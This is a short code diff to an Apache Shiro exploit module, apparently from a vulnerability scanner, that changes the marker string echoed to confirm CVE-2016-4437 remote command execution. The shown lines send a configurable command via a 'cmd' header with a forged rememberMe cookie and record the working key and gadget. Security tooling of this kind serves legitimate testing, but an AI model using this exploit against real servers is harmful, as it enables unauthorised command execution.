@@ -42,8 +42,9 @@ class ApacheShiro():
         self.timeout = int(env.get('timeout'))
         self.retry_time = int(env.get('retry_time'))
         self.retry_interval = int(env.get('retry_interval'))
-        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
-        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
+        self.flag = GlobalVar.get_value('flag')
+        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo {}'.format(self.flag))
+        self.linux_cmd = env.get('cmd', 'echo {}'.format(self.flag))
 
     #检测是否存在漏洞
     def cve_2016_4437(self):
@@ -292,7 +293,7 @@ class ApacheShiro():
 
                                     win_text = exprequest.get(self.url+path, headers={'cmd': self.win_cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
                                     linux_text = exprequest.get(self.url+path, headers={'cmd': self.linux_cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
-                                    if "VuLnEcHoPoCSuCCeSS" in win_text or "VuLnEcHoPoCSuCCeSS" in linux_text:
+                                    if self.flag in win_text or self.flag in linux_text:
                                         GlobalVar.set_value('key', key)
                                         GlobalVar.set_value('gadget', gadget)
                                         GlobalVar.set_value('echo', echo)
